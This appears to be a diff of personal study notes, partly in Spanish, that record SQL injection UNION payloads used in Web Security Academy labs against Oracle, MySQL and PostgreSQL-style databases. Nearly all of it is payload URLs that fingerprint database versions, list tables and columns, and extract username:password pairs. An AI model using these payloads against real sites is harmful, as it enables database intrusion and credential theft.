@@ -64,9 +64,9 @@ http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT NUL
 http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION group_concat(schema_name),NULL from information_schema.schemata-- -   -> listar database
 http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION table_name,NULL from information_schema.tables-- -                    -> listar tablas
 
-http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION table_name,NULL from information_schema.tables WHERE table.schema='DB'-- -
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION table_name,NULL from information_schema.tables WHERE table_schema='DB'-- -
 
-http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION column_name,NULL from information_schema.columns WHERE table.schema='DB' and table_name='table'-- -
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION column_name,NULL from information_schema.columns WHERE table_schema='DB' and table_name='table'-- -
 
 union select group_concat(username,':',password) from users-- - o ||':'|| para concatenar
 
@@ -77,8 +77,54 @@ union select group_concat(username,':',password) from users-- - o ||':'|| para c
 
 
 #### #### Lab: SQL injection UNION attack, retrieving multiple values in a single column #### #### 
+union select group_concat(username,':',password) from users-- - o ||':'|| para concatenar
 
+
+
+
+
+
+
+#### #### ORACLE #### ####
+  #### #### SQL injection attack, querying the database type and version on Oracle #### #### 
+
+https://0aed0078030997ae804821a900e8009a.web-security-academy.net/filter?category=Accessories%27union%20select%20null,banner%20from%20v$version--%20-
+' UNION SELECT null, banner from v$version-- -
+
+  #### #### SQL injection attack, listing the database contents on Oracle #### ####
+
+https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,NULL%20from%20dual--%20-
+' UNION SELECT NULL,NUL from dual-- -
+https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,table_name%20from%20all_tables--%20-
+' UNION SELECT NULL,table_name from all_tables-- -
+https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,column_name%20from%20all_tab_columns%20where%20table_name=%27USERS_HANNJE%27--%20-
+' UNION SELECT NULL,column_name from all_tab_columns where table_name='USERS_HANNJE'-- -
 https://0a5e000e04c13152803617b90013008e.web-security-academy.net/filter?category=Pets%27%20union%20select%20null,username||%27:%27||password%20from%20users--%20-
+' union select null,username||':'||password from users-- -
+https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20union%20select%20NULL,USERNAME_TZEWHC||%27:%27||PASSWORD_XAJTIK%20from%20USERS_HANNJE--%20-
+' union select NULL,USERNAME_TZEWHC||':'||PASSWORD_XAJTIK from USERS_HANNJE-- -
+
+
+
+
+
+
+
+  
+#### #### SQL #### ####
+    #### #### SQL injection attack, querying the database type and version on MySQL and Microsoft #### #### 
+
+https://0aef004e03ab30ae81d9a2b900770090.web-security-academy.net/filter?category=Gifts%27%20union%20select%20null,@@version--%20-
+' UNION SELECT null, @@version-- -
+
+
+    #### #### SQL injection attack, listing the database contents on non-Oracle databases #### #### 
+
+
+https://0a1100510486b06c81d116f4001a0046.web-security-academy.net/filter?category=Pets%27%20union%20select%20NULL,column_name%20from%20information_schema.columns%20where%20table_schema=%27public%27%20and%20table_name=%27users_qmoism%27--%20-
+https://0a1100510486b06c81d116f4001a0046.web-security-academy.net/filter?category=Pets%27%20UNION%20select%20NULL,password_sfzjvs||%27:%27||username_hvkxom%20from%20public.users_qmoism--%20-
+
+' UNION SELECT NULL, username_hvkxom||':'||password_sfzjvs from users_qmoism
 
 
 
